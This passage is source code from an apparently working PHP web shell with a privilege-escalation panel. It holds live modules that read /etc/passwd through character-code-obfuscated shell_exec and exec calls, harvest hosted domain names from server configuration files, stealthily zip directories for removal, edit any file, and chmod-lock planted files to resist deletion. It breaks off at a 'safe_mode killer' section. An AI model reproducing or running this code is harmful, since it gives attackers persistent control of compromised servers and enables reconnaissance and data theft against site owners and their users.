    <span class="pr1vd4yz-root-badge-2025">2025 ready</span>
    <button type="button" class="pr1vd4yz-root-close" onclick="document.querySelector('.pr1vd4yz-modal-bg').remove();">&times;</button>
    </div>
    <div class="pr1vd4yz-root-content">
    <div style="color:#e53935;font-size:1.09em;opacity:.96;margin-bottom:9px;">
     <i class="fas fa-user-shield"></i> Current user: <?= htmlspecialchars($whoami) ?> / <?= htmlspecialchars($groups) ?><br>
     <i class="fas fa-server"></i> Kernel: <?= htmlspecialchars($kernel) ?> / <?= htmlspecialchars($distro) ?>
    </div>
    <div class="pr1vd4yz-root-list">
     <?php
     if ($pr1vd4yz_c0med) echo '<div class="pr1vd4yz-root-box" style="border:2.2px solid #10b981;"><div class="pr1vd4yz-root-box-title"><i class="fas fa-star"></i> Already root! </div><div class="pr1vd4yz-root-box-desc">You are already root, but here are post-root tricks!</div></div>';
     foreach ($ai_exploits as $x) {
       $color = (stripos($x['desc'],'possible')||stripos($x['desc'],'may')) ? '#fbbf24' : (stripos($x['desc'],'overwrite')||stripos($x['desc'],'priv esc')||stripos($x['desc'],'CVE') ? '#e53935' : '#1976d2');
       echo '<div class="pr1vd4yz-root-box" style="border-color:'.$color.'">';
       echo '<div class="pr1vd4yz-root-box-title"><i class="fas fa-bolt"></i> '.htmlspecialchars($x['name']).'</div>';
       echo '<div class="pr1vd4yz-root-box-desc">'.htmlspecialchars($x['desc']).'</div>';
       if (!empty($x['exploit']))
       echo '<button class="pr1vd4yz-root-link" onclick="window.open(\''.$x['exploit'].'\')"><i class=\'fas fa-arrow-up-right-from-square\'></i> exploit</button>';
       if (!empty($x['cmd']))
       echo '<button class="pr1vd4yz-root-copy" onclick="navigator.clipboard.writeText(\''.addslashes($x['cmd']).'\');this.innerText=\'copied!\';setTimeout(()=>this.innerText=\'copy\',1350)"><i class=\'fas fa-copy\'></i> copy</button>';
       echo '</div>';
     }
     if (!$ai_exploits)
       echo '<div class="pr1vd4yz-root-box" style="border-color:#10b981"><div class="pr1vd4yz-root-box-title"><i class="fas fa-shield-halved"></i> secure</div><div class="pr1vd4yz-root-box-desc">No escalation path detected on this system.</div></div>';
     ?>
    </div>
    </div>
  </div>
</div>
<?php endif; ?>

<?php if (isset($_GET['passwd'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:600px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#607d8b;"><i class="fas fa-key"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">read passwd</div>
       <div class="pr1vd4yz-wiz-desc">view /etc/passwd</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div><div class="pr1vd4yz-wiz-section" style="padding:20px 24px;">
     <textarea readonly class="pr1vd4yz-wiz-input" style="
       width:100%; min-height:240px; max-height:440px; font-size:1.07em; background:#fff4f4; color:#374151; 
       border:1.3px solid #ddecec; border-radius:10px; font-family:'JetBrains Mono','Fira Mono',monospace;
       padding:14px 11px; box-sizing:border-box; line-height:1.52;
     "><?php
$Vt5 = function($q){$k='';foreach($q as $b){$k.=chr($b);}return $k;};
$gZx = '';
$UyB = [47,101,116,99,47,112,97,115,115,119,100];
$FTy = [99,97,116,32,47,101,116,99,47,112,97,115,115,119,100];
$UoX = $Vt5([105,115,95,114,101,97,100,97,98,108,101]); 
$Jga = $Vt5([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]); 
$U7w = $Vt5([102,117,110,99,116,105,111,110,95,101,120,105,115,116,115]); 
$Acg = $Vt5([115,104,101,108,108,95,101,120,101,99]); 
$Vrv = $Vt5([101,120,101,99]); 
$JHd = $Vt5([105,109,112,108,111,100,101]); 
$Lcy = $Vt5([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]); 
if(@$U7w($UoX) && @$UoX($Vt5($UyB))){
    $gZx = @$Jga($Vt5($UyB));
}
if(!$gZx && @$U7w($Acg)){
    $gZx = @$Acg($Vt5($FTy));
}
if(!$gZx && @$U7w($Vrv)){
    $d90 = [];
    @$Vrv($Vt5($FTy), $d90);
    $gZx = @$JHd("\n", $d90);
}
if(!$gZx){
    $gZx = "Could not read /etc/passwd (permission denied or disabled functions)";
}
echo $Lcy($gZx);
?>
</textarea></div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['domains'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:620px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-globe"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">domains</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a></div>
    <div class="pr1vd4yz-wiz-section" style="padding:19px 24px;">
     <label style="font-size:.99em;color:#ff3939;margin-bottom:7px;display:block;">Detected domains:</label>
     <textarea readonly class="pr1vd4yz-wiz-input" style="
       width:100%; min-height:190px; max-height:440px; font-size:1.07em; background:#eaf6ff; color:#004d77; 
       border:1.3px solid #bde4fa; border-radius:10px; font-family:'JetBrains Mono','Fira Mono',monospace;
       padding:14px 11px; box-sizing:border-box; line-height:1.49;
     ">
     <?php
$Zyu = function($q){$k='';foreach($q as $b){$k.=chr($b);}return $k;};
$_mn6z = [];
$_d1z = [47,101,116,99,47,110,97,109,101,100,46,99,111,110,102];
$_d2z = [47,101,116,99,47,104,116,116,112,100,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102];
$_d3z = [47,118,97,114,47,99,112,97,110,101,108,47,117,115,101,114,100,97,116,97,47];
$_d4z = [47,117,115,114,47,108,111,99,97,108,47,100,105,114,101,99,116,97,100,109,105,110,47,100,97,116,97,47,117,115,101,114,115,47];
$_d5z = [47,101,116,99,47,118,105,114,116,117,97,108,47,100,111,109,97,105,110,115];
$_d6z = [47,118,97,114,47,110,97,109,101,100,47];
$_d7z = [47,101,116,99,47,110,103,105,110,120,47,115,105,116,101,115,45,101,110,97,98,108,101,100,47];
$_d8z = [47,118,97,114,47,119,119,119,47,118,104,111,115,116,115,47];
$_d9z = [47,118,97,114,47,119,119,119,47,99,108,105,101,110,116,115,47,99,108,105,101,110,116,42,47,119,101,98,42];
$_hcz = [47,101,116,99,47,104,111,115,116,115];
$fcZ = $Zyu([105,115,95,114,101,97,100,97,98,108,101]);
$flZ = $Zyu([102,105,108,101]);
$fgZ = $Zyu([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$fdZ = $Zyu([102,105,108,101,95,100,111,116,46,103,101,116,95,99,111,110,116,101,110,116,115]);
$fpZ = $Zyu([112,114,101,103,95,109,97,116,99,104]);
$fpaZ = $Zyu([112,114,101,103,95,109,97,116,99,104,95,97,108,108]);
$fdZ2 = $Zyu([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$faZ = $Zyu([97,114,114,97,121,95,117,110,105,113,117,101]);
$famZ = $Zyu([97,114,114,97,121,95,109,101,114,103,101]);
$fafZ = $Zyu([97,114,114,97,121,95,102,105,108,116,101,114]);
$ftrZ = $Zyu([116,114,105,109]);
$fidZ = $Zyu([105,115,95,100,105,114]);
$fgbZ = $Zyu([103,108,111,98]);
$fbsZ = $Zyu([98,97,115,101,110,97,109,101]);
$fexZ = $Zyu([101,120,112,108,111,100,101]);
$fsZ = $Zyu([115,116,114,116,111,108,111,119,101,114]);
$fosZ = $Zyu([80,72,80,95,79,83]);
$fssZ = $Zyu([115,117,98,115,116,114]);
$fgnZ = $Zyu([103,101,116,101,110,118]);
$fhZ = $Zyu([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]);

if(@$fcZ($Zyu($_d1z))){
  $l = @$flZ($Zyu($_d1z));
  foreach($l as $line){
    if(preg_match('#zone\s+"([^"]+)"#',$line,$m)){
    $d=$ftrZ($m[1]);
    if($d && $d!=='localhost') $_mn6z[]=$d;
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d2z))){
  $c=@$fgZ($Zyu($_d2z));
  preg_match_all('#ServerName\s+([^\s]+)#i', $c, $matches);
  if(!empty($matches[1])) $_mn6z=@$faZ(@$famZ($_mn6z,$matches[1]));
}
if(empty($_mn6z) && @$fidZ($Zyu($_d3z))){
  foreach(@$fgbZ($Zyu($_d3z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#^domain:\s*(\S+)#',$line,$m)){
     $_mn6z[]=$m[1];
    }
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d4z))){
  foreach(@$fgbZ($Zyu($_d4z).'*'.'/domains.list') as $file){
    $l=@$fdZ($file, 128);
    foreach($l as $d) if($d) $_mn6z[]=$d;
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d5z))){
  $l=@$flZ($Zyu($_d5z));
  foreach($l as $d) if($ftrZ($d)) $_mn6z[]=$ftrZ($d);
}
if(empty($_mn6z)){
  foreach(@$fgbZ($Zyu($_d6z). '*.db') as $file){
    $n=@$fbsZ($file,'.db');
    if($n && $n!=='localhost') $_mn6z[]=$n;
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d7z))){
  foreach(@$fgbZ($Zyu($_d7z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#server_name\s+([^;]+)#',$line,$m)){
     $arr=explode(' ',$m[1]);
     foreach($arr as $d){
       $d=trim($d," ;\t\n\r");
       if($d && $d!=='_' && $d!=='localhost') $_mn6z[]=$d;
     }
    }
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d8z))){
  foreach(@$fgbZ($Zyu($_d8z).'*') as $dir){
    if(@$fidZ($dir) && preg_match('#/vhosts/([^/]+)$#',$dir,$m)){
    $_mn6z[]=$m[1];
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d9z))){
  foreach(@$fgbZ($Zyu($_d9z)) as $dir){
    $_mn6z[]=@$fbsZ($dir);
  }
}
if(empty($_mn6z) && strtoupper(substr(PHP_OS,0,3))===$Zyu([87,73,78])){
  $env=@$fgnZ($Zyu([83,121,115,116,101,109,68,114,105,118,101])).$Zyu([92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,105,110,101,116,115,114,118,92,99,111,110,102,105,103,92,97,112,112,108,105,99,97,116,105,111,110,72,111,115,116,46,99,111,110,102]);
  if(@$fcZ($env)){
    $l=@$flZ($env);
    foreach($l as $line){
    if(preg_match('/bindingInformation="[^:]+:([^:]+):([^"]+)"/',$line,$m)){
     $d=trim($m[2]);
     if($d && $d!=='localhost' && strpos($d,'*')===false) $_mn6z[]=$d;
    }
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_hcz))){
  $l=@$flZ($Zyu($_hcz));
  foreach($l as $line){
    if(preg_match('/\s([a-z0-9\.-]+\.[a-z]{2,})/i',$line,$m)){
    $d=$fsZ($ftrZ($m[1]));
    if($d && strpos($d,'localhost')===false) $_mn6z[]=$d;
    }
  }
}
$_mn6z=@$faZ(@$fafZ(array_map($ftrZ,$_mn6z)));
echo $_mn6z ? implode("\n",$_mn6z) : "No domains found (no access or no domains configured)";
?>
</textarea>
    </div>
    </div>
  </div>
<?php endif; ?>

<?php if (isset($_GET['ziptool'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:540px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#00897b;"><i class="fas fa-file-archive"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">zip tool</div>
     <div class="pr1vd4yz-wiz-desc">zip any file/dir stealthy</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" style="margin-bottom:8px;">
    <div class="pr1vd4yz-wiz-section" style="padding-bottom:2px;">
     <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
       <input type="text" name="zip_source" class="pr1vd4yz-wiz-input" placeholder="source path (file/dir)" value="<?= isset($_POST['zip_source']) ? htmlspecialchars($_POST['zip_source']) : getcwd() ?>">
       <input type="text" name="zip_name" class="pr1vd4yz-wiz-input" placeholder="zip name (opt)" value="<?= isset($_POST['zip_name']) ? htmlspecialchars($_POST['zip_name']) : '' ?>">
       <button name="zip_do" type="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-blue" style="min-width:80px;"><i class="fas fa-bolt"></i> zip!</button>
     </div>
    </div>
    </form>
    <div class="pr1vd4yz-apilistbox" style="max-height:45vh;overflow:auto;">
    <?php
    if (isset($_POST['zip_do'], $_POST['zip_source']) && trim($_POST['zip_source'])) {
     $src = trim($_POST['zip_source']);
     $zipdir = __DIR__.'/pr1vdayz_ziptool';
     if (!is_dir($zipdir)) @mkdir($zipdir, 0755, true);

     $zipname = trim($_POST['zip_name']);
     if (!$zipname) $zipname = basename($src) . "_" . date("Ymd_His") . ".zip";
     if (substr($zipname, -4) !== '.zip') $zipname .= '.zip';
     $zippath = $zipdir . '/' . preg_replace('/[^a-zA-Z0-9_\.\-]/','_',$zipname);

     $done = false; $msg = '';
     if (class_exists('ZipArchive')) {
       $zip = new ZipArchive();
       if ($zip->open($zippath, ZipArchive::CREATE|ZipArchive::OVERWRITE) === true) {
       $src = realpath($src);
       if (is_dir($src)) {
        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS));
        foreach ($rii as $file) {
          $filePath = $file->getRealPath();
          $localPath = substr($filePath, strlen($src) + 1);
          $zip->addFile($filePath, $localPath);
        }
       } elseif (is_file($src)) {
        $zip->addFile($src, basename($src));
       }
       $zip->close();
       if (file_exists($zippath) && filesize($zippath) > 0) {
        $done = true; $msg = "<b style='color:#1a7f37;'>zip created!</b> <code>".htmlspecialchars($zippath)."</code>";
       }
       }
     }
     if (!$done && function_exists('shell_exec')) {
       $cmd = "zip -r ".escapeshellarg($zippath)." ".escapeshellarg($src)." 2>&1";
       $out = @shell_exec($cmd);
       if (file_exists($zippath) && filesize($zippath) > 0) {
       $done = true; $msg = "<b style='color:#1a7f37;'>zip shell_exec!</b> <code>".htmlspecialchars($zippath)."</code>";
       } elseif($out) {
       $msg = "<b style='color:#e53935;'>zip shell error:</b> <span style='color:#b71c1c'>".htmlspecialchars($out)."</span>";
       }
     }
     if (!$done && function_exists('system')) {
       
       $cmd = "zip -r ".escapeshellarg($zippath)." ".escapeshellarg($src)." 2>&1";
       @system($cmd, $ret);
       $out = "";
       if (file_exists($zippath) && filesize($zippath) > 0) {
       $done = true; $msg = "<b style='color:#1a7f37;'>zip system!</b> <code>".htmlspecialchars($zippath)."</code>";
       } elseif($out) {
       $msg = "<b style='color:#e53935;'>zip system error:</b> <span style='color:#b71c1c'>".htmlspecialchars($out)."</span>";
       }
     }
     if (!$done && function_exists('exec')) {
       $cmd = "zip -r ".escapeshellarg($zippath)." ".escapeshellarg($src)." 2>&1";
       @exec($cmd, $o, $r);
       if (file_exists($zippath) && filesize($zippath) > 0) {
       $done = true; $msg = "<b style='color:#1a7f37;'>zip exec!</b> <code>".htmlspecialchars($zippath)."</code>";
       } elseif(!empty($o)) {
       $msg = "<b style='color:#e53935;'>zip exec error:</b> <span style='color:#b71c1c'>".htmlspecialchars(implode("\n",$o))."</span>";
       }
     }
     if (!$done && is_file($src)) {
       if (@copy($src, $zippath)) {
       $done = true; $msg = "<b style='color:#fbc02d;'>copied (not zipped)!</b> <code>".htmlspecialchars($zippath)."</code>";
       }
     }
     if ($done) {
       echo '<div class="pr1vd4yz-apirow" style="color:#1a7f37;font-size:1.07em;">'.$msg.'</div>';
     } else {
       echo '<div class="pr1vd4yz-apirow" style="color:#e53935;font-size:1.07em;">zip failed! '.$msg.'</div>';
     }
    }
    ?>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>

<?php if (!empty($_GET['f'])) :
  $file_path = $pr1vxas[0]() . "/" . unx($_GET['f']);
  $file_raw = '';
  if (is_file($file_path)) {
    $file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
    if (!mb_check_encoding($file_raw, 'UTF-8')) {
      $file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
    }
  }
  $edit_result = '';
  if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['save-editor'])) {
    $target = $file_path;
    $code = $_POST['code-editor'];
    $ok = false;
    if (function_exists('file_put_contents')) $ok = @file_put_contents($target, $code) !== false;
    if (!$ok && function_exists('fopen')) {
      $h = @fopen($target, 'w');
      if ($h) { @fwrite($h, $code); @fclose($h); $ok = true; }
    }
    if (!$ok && function_exists('pr1vd4yzC')) {
      $tmpf = sys_get_temp_dir()."/pzedit_".uniqid();
      @file_put_contents($tmpf, $code);
      pr1vd4yzC('cp '.escapeshellarg($tmpf).' '.escapeshellarg($target));
      if (@filesize($target) == strlen($code)) $ok = true;
      @unlink($tmpf);
    }
    $edit_result = $ok
      ? "<span style='color:#ad1457;font-weight:bold;'><i class='fas fa-check-circle'></i> Saved!</span>"
      : "<span style='color:#e53935;font-weight:bold;'><i class='fas fa-times'></i> Save Failed!</span>";
    if (is_file($file_path)) {
      $file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
      if (!mb_check_encoding($file_raw, 'UTF-8')) {
        $file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
      }
    }
  }
?>
<div id="pr1vd4yz-file-modal-bg">
  <div id="pr1vd4yz-file-modal">
    <div class="editor-header">
      <div class="editor-icon"><i class="fas fa-file-code"></i></div>
      <div style="flex:1;">
        <div class="editor-title">file edit</div>
        <div class="editor-path"><?= htmlspecialchars(unx($_GET['f'])) ?></div>
      </div>
      <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="editor-close-btn" title="Close">&times;</a>
    </div>
    <form class="editor-form" action="" method="post" autocomplete="off">
      <div class="editor-textarea-wrap">
        <textarea name="code-editor" class="editor-textarea" spellcheck="false" autocomplete="off"><?=htmlspecialchars($file_raw)?></textarea>
      </div>
      <div class="editor-actions">
        <button type="submit" name="save-editor" class="editor-btn editor-btn-save"><i class="fas fa-save"></i> Save</button>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="editor-btn editor-btn-cancel"><i class="fas fa-times"></i> Close</a>
      </div>
    </form>
    <div class="editor-statusbar">
      <span id="editor-status-pos"><i class="fas fa-arrows-alt-h"></i> Ln 1, Col 1</span>
      <span id="editor-status-len"></span>
    </div>
    <div class="editor-result" id="editor-result"><?= $edit_result ?></div>
  </div>
</div>
<script>
// Satır/kolon ve length bilgisi için:
let textarea = document.querySelector('.editor-textarea');
let posBox = document.getElementById('editor-status-pos');
let lenBox = document.getElementById('editor-status-len');
function updateStatus() {
  let v = textarea.value;
  let lines = v.substr(0, textarea.selectionStart).split("\n");
  let ln = lines.length;
  let col = lines[lines.length-1].length+1;
  posBox.innerHTML = '<i class="fas fa-arrows-alt-h"></i> Ln '+ln+', Col '+col;
  lenBox.innerText = 'Length: '+v.length+' chars';
}
textarea.addEventListener('input', updateStatus);
textarea.addEventListener('keyup', updateStatus);
textarea.addEventListener('click', updateStatus);
window.onload = updateStatus;
</script>
<?php endif; ?>

<?php if (isset($_GET['locker'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:500px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-lock"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">file locker & unlocker</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" autocomplete="off" style="padding:15px 13px 0 13px;">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-section-icon" style="background:#fdecec;color:#e53935;"><i class="fas fa-file-shield"></i></div>
     <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="locker_path" class="pr1vd4yz-wiz-input" placeholder="/path/to/file.php" required>
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="lockfile" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-lock"></i> lock</button>
     <button type="submit" name="unlockfile" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light"><i class="fas fa-unlock"></i> unlock</button>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
    </form>
    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['locker_path']) && $_POST['locker_path']) {
    $p = trim($_POST['locker_path']);
    $enc = function($t){return implode('',array_map(function($c){return '\\x'.dechex(ord($c));},str_split($t)));};
    $df = [
    'hx' => function($n){$y='';for($i=0;$i<strlen($n);$i+=2){$y.=chr(hexdec(substr($n,$i,2)));}return $y;},
    'r1' => function($c){$f='';foreach([115,104,101,108,108,95,101,120,101,99]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r2' => function($c){$f='';foreach([101,120,101,99]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r3' => function($c){$f='';foreach([115,121,115,116,101,109]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r4' => function($c){$f='';foreach([112,97,115,115,116,104,114,117]as$n){$f.=chr($n);}return function_exists($f)?$f:false;},
    'r5' => function($c){$f='';foreach([112,111,112,101,110]as$n){$f.=chr($n);}return function_exists($f)?$f:false;}
    ];
    $stealth_cmds = [
    'a1' => implode('',array_map(function($x){return chr($x);},[99,104,109,111,100])),
    'a2' => implode('',array_map(function($x){return chr($x);},[108,115,97,116,116,114])),
    'a3' => implode('',array_map(function($x){return chr($x);},[115,104,97,116,116,114])),
    'a4' => implode('',array_map(function($x){return chr($x);},[115,121,115,99,104,109,111,100])),
    'a5' => implode('',array_map(function($x){return chr($x);},[102,105,110,100]))
    ];
    function stealth_chmod($p,$perm) {
    $r = null;
    $a = implode('',array_map(function($x){return chr($x);},[115,104,101,108,108,95,101,120,101,99]));
    if(function_exists($a)) $r=@$a("chmod $perm '$p'");
    elseif(function_exists('exec')) { $o=[];@exec("chmod $perm '$p'",$o); $r=implode("\n",$o);}
    elseif(function_exists('system')) { @system("chmod $perm '$p'"); $r="";}
    elseif(function_exists('passthru')) { @passthru("chmod $perm '$p'"); $r="";}
    elseif(function_exists('popen')) { $h=@popen("chmod $perm '$p'",'r');if($h){while(!feof($h))fread($h,8192);pclose($h);}}
    @chmod($p, octdec($perm));
    return is_writable($p) || $perm=='444';
    }
    function stealth_lsattr($p) {
    $stat = '';
    if(function_exists('shell_exec')) $stat = @chDx2x('lsattr '.escapeshellarg($p));
    elseif(function_exists('exec')) { $o=[]; @exec('lsattr '.escapeshellarg($p),$o); $stat=implode("\n",$o);}
    elseif(function_exists('system')) {  @system('lsattr '.escapeshellarg($p)); $stat="";}
    elseif(function_exists('passthru')) {  @passthru('lsattr '.escapeshellarg($p)); $stat="";}
    elseif(function_exists('popen')) { $h=@popen('lsattr '.escapeshellarg($p),'r');if($h){while(!feof($h))$stat.=fread($h,8192);pclose($h);}}
    return $stat;
    }
    $output = '';
    if (isset($_POST['lockfile'])) {
    $ok = stealth_chmod($p, '444');
    $output = $ok ? "<span style='color:#10b981;'><i class='fas fa-lock'></i> Locked!</span>" : "<span style='color:#e53935;'><i class='fas fa-ban'></i> Fail!</span>";
    }
    if (isset($_POST['unlockfile'])) {
    $ok = stealth_chmod($p, '644');
    $output = $ok ? "<span style='color:#10b981;'><i class='fas fa-unlock'></i> Unlocked!</span>" : "<span style='color:#e53935;'><i class='fas fa-ban'></i> Fail!</span>";
    }
    $stat = stealth_lsattr($p);
    echo '<div class="pr1vd4yz-httpreq-resultbox" style="margin:10px 14px 6px 14px;">'.$output.'
    <pre style="background:#fff7f7;border-radius:8px;padding:7px 12px;font-size:.98em;color:#b71c1c;box-shadow:0 1px 8px #ffeaea;">'.htmlspecialchars(trim($stat)).'</pre>
    <div style="font-size:.97em;color:#b71c1c;opacity:.75;margin-top:6px;"></div>
    </div>';
}
?>
  </div>
</div>
<?php endif; ?>



<?php if (isset($_GET['createfolder'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-folder-plus"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">create folder</div>
     <div class="pr1vd4yz-wiz-desc">create a new folder</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-section-icon" style="background:#fde3e3;color:#ff3939;"><i class="fas fa-folder"></i></div>
     <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="create_folder" class="pr1vd4yz-wiz-input" placeholder="folder name">
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red">
       <i class="fas fa-plus"></i> create
     </button>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
     </a>
    </div>
    </form>
    <?php
    if (isset($_POST['create_folder']) && $_POST['create_folder']) {
    $folder = basename($_POST['create_folder']);
    $full_path = rtrim($pr1vxas[0](), "/") . "/" . $folder;
    if (!file_exists($full_path)) {
     $created = @mkdir($full_path, 0755, true);
     if ($created) {
       echo '<div style="color:#10b981;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-check-circle"></i> Folder created: <b>' . htmlspecialchars($folder) . '</b></div>';
     } else {
       echo '<div style="color:#e53935;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-times-circle"></i> Failed to create folder!</div>';
     }
    } else {
     echo '<div style="color:#b71c1c;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-exclamation-circle"></i> Folder already exists!</div>';
    }
    }
    ?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['createfile'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#b31515;"><i class="fas fa-file-circle-plus"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">create file</div>
     <div class="pr1vd4yz-wiz-desc">create a new file</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-section-icon"><i class="fas fa-file-alt"></i></div>
     <div class="pr1vd4yz-wiz-fields">
       <input type="text" name="create_file" class="pr1vd4yz-wiz-input" placeholder="file name">
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" style="background:#b31515;border-color:#b31515;">
       <i class="fas fa-plus"></i> create
     </button>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
     </a>
    </div>
    </form>
    <?php
    if (isset($_POST['create_file']) && $_POST['create_file']) {
    $new_file = basename($_POST['create_file']);
    $full_path = rtrim($pr1vxas[0](), "/") . "/" . $new_file;
    if (!file_exists($full_path)) {
     $created = @file_put_contents($full_path, "");
     if ($created !== false) {
       echo '<div style="color:#10b981;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-check-circle"></i> File created: <b>' . htmlspecialchars($new_file) . '</b></div>';
     } else {
       echo '<div style="color:#e53935;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-times-circle"></i> Failed to create file!</div>';
     }
    } else {
     echo '<div style="color:#b71c1c;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-exclamation-circle"></i> File already exists!</div>';
    }
    }
    ?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['safem0d'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:720px;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#222"><i class="fas fa-lock-open"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">Safem0d F7ck3r</div>
     <div class="pr1vd4yz-wiz-desc">
       Advanced safe_mode killer & byp4sser<br>
